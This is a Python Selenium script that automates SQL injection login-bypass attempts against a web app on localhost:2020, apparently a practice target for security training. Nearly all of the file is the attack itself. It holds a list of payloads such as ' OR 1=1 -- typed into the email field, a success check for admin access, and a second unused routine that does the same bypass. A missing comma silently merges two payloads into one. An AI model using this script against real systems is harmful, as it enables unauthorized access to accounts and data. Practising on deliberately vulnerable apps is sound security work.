from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time




def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("http://localhost:2020/#/login")

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    attempt_sql_injections(driver)

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()
    exit()

def attempt_sql_injections(driver):
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR ''='",
        "' OR 1=1#",
        "' OR 'a'='a",
        "' OR 1=1/*",
        "' OR 1=1--",
        "' OR 1=1;--",
        "' OR 1=1 OR ''='"
        "' OR 1=1 --",

    ]

    for payload in sql_payloads:
        try:
            emailField = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "email"))
            )
            emailField.send_keys(payload)
            passwordField = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
            passwordField.send_keys("password")
            passwordField.send_keys(Keys.RETURN)

            # Wait to see if login was successful
            time.sleep(5)

            # Check if login was successful
            if "admin" in driver.page_source.lower():
                print(f"SQL Injection successful with payload: {payload}")
                return True
            else:
                print(f"SQL Injection failed with payload: {payload}")

        except Exception as e:
            print(f"Error with payload {payload}: {e}")

    return False
def logInAdminSql(driver):
    

    # Attempt to log in
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()

        emailField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        emailField.send_keys("\' OR 1=1 --")
        passwordField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        passwordField.send_keys("password")
        passwordField.send_keys(Keys.RETURN)
    except Exception as e:
        print(f"Could not enter text: {e}")

if __name__ == "__main__":
    main()



